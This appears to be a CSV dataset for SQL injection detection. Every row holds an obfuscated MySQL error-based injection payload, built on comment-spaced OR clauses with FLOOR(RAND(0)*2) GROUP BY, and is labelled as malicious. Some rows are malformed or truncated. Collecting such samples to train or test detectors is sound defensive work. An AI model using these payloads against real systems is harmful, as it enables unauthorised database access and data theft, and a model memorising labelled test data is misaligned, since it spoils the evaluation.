input_text,Label,classification, ,,,,,,
"-8788""))/**/AS/**/sgxl/**/WHERE/**/9334=9334/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes.,,,,,,,
"-8111'))/**/AS/**/FoVB/**/WHERE/**/7935=7935/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-5325/**/WHERE/**/6753=6753/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-4551""/**/WHERE/**/8046=8046/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes.,,,,,,,
"-6242'/**/WHERE/**/7055=7055/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-7916)/**/WHERE/**/9511=9511/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-58-5854"""")/**/WHERE/**/5025=5025/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071",(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,"FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#""",1,,,,,
"-4721')/**/WHERE/**/6979=6979/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-4986"")))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-7706""))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-7941"")/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-9013%'/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-3462')))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-4220'))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-3121/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-2116)))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-2916))/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-5024""/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-1381'/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-5394')/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"-1721)/**/OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7162707071,(SELECT/**/(CASE/**/WHEN/**/(4542=4542)/**/THEN/**/1/**/ELSE/**/0/**/END)),0x7171706a71,FLOOR(RAND(0)*2))/**/HAVING/**/MIN(0)#",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)#",1,Yes,,,,,,,
"]-(SELECT/**/0/**/WHERE/**/5788=5788/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))|[",1,Yes,,,,,,,
"""=""""/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/""""=""",1,Yes,,,,,,,
"`=``/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/``=`",1,Yes,,,,,,,
"`)/**/WHERE/**/6711=6711/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/Qias",1,Yes,,,,,,,
"`/**/WHERE/**/6295=6295/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/OSZH",1,Yes,,,,,,,
")/**/AS/**/dwzC/**/WHERE/**/9571=9571/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/bRst",1,Yes,,,,,,,
""")/**/AS/**/NhLV/**/WHERE/**/1802=1802/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/EdtZ",1,Yes,,,,,,,
"')/**/AS/**/SowO/**/WHERE/**/4749=4749/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/fSPh",1,Yes,,,,,,,
"))/**/AS/**/ZXSu/**/WHERE/**/1116=1116/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/dttC",1,Yes,,,,,,,
"""))/**/AS/**/qtBN/**/WHERE/**/7812=7812/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/TPAk",1,Yes.,,,,,,,
"'))/**/AS/**/jIAc/**/WHERE/**/3504=3504/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/PeVM",1,Yes,,,,,,,
"+(SELECT/**/0x57676743/**/WHERE/**/3511=3511/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**",1,Yes,,,,,,,
"+(SELECT/**/wflJ/**/WHERE/**/6273=6273/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION",1,Yes.,,,,,,,
"||(SELECT/**/0x6a414441/**/WHERE/**/2490=2490/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))||",1,Yes,,,,,,,
"||(SELECT/**/0x666d5644/**/FROM/**/DUAL/**/WHERE/**/5963=5963/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))||",1,Yes,,,,,,,
"'+(SELECT/**/0x45595656/**/WHERE/**/4336=4336/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))+'",1,Yes.,,,,,,,
"'||(SELECT/**/0x65644b4a/**/FROM/**/DUAL/**/WHERE/**/6965=6965/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))||'",1,Yes,,,,,,,
"'||(SELECT/**/0x50486f66/**/WHERE/**/4535=4535/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x))||'",1,Yes,,,,,,,
"/**/WHERE/**/8808=8808/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/qMqT",1,Yes,,,,,,,
"""/**/WHERE/**/1488=1488/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/SkKU",1,Yes,,,,,,,
"'/**/WHERE/**/5812=5812/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/BXxt",1,Yes,,,,,,,
")/**/WHERE/**/5985=5985/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/eRxA",1,Yes,,,,,,,
""")/**/WHERE/**/2495=2495/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/amOG",1,Yes,,,,,,,
"')/**/WHERE/**/9503=9503/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/MrWC",1,Yes,,,,,,,
"'/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/OR/**/'EfJz'='FWlP",1,Yes,,,,,,,
"/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)#/**/KdqT",1,Yes,,,,,,,
"/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/xUtC",1,Yes,,,,,,,
"""/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/""QVvA""/**/LIKE/**/""QVvA",1,Yes,,,,,,,
""")))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(((""ZltI""/**/LIKE/**/""ZltI",1,Yes,,,,,,,
"""))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/((""viOY""/**/LIKE/**/""viOY",1,Yes,,,,,,,
""")/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(""tILB""/**/LIKE/**/""tILB",1,Yes,,,,,,,
"""/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/""VAFd""=""VAFd",1,Yes,,,,,,,
""")))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(((""vQQM""=""vQQM",1,Yes,,,,,,,
"""))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/((""GfOL""=""GfOL",1,Yes,,,,,,,
""")/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(""PQII""=""PQII",1,Yes,,,,,,,
"'/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/'gBsK'/**/LIKE/**/'gBsK",1,Yes,,,,,,,
"%'/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/'dpcW%'='dpcW",1,Yes,,,,,,,
"')))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/((('tXsx'/**/LIKE/**/'tXsx",1,Yes,,,,,,,
"'))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(('DGxD'/**/LIKE/**/'DGxD",1,Yes,,,,,,,
"')/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/('JLNy'/**/LIKE/**/'JLNy",1,Yes,,,,,,,
"'/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/'CtRd'='CtRd",1,Yes.,,,,,,,
"')))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/((('IHTK'='IHTK",1,Yes,,,,,,,
"'))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(('UgcP'='UgcP",1,Yes,,,,,,,
"')/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/('DArF'='DArF",1,Yes,,,,,,,
"/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)",1,Yes.,,,,,,,
")))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(((4181=4181",1,Yes,,,,,,,
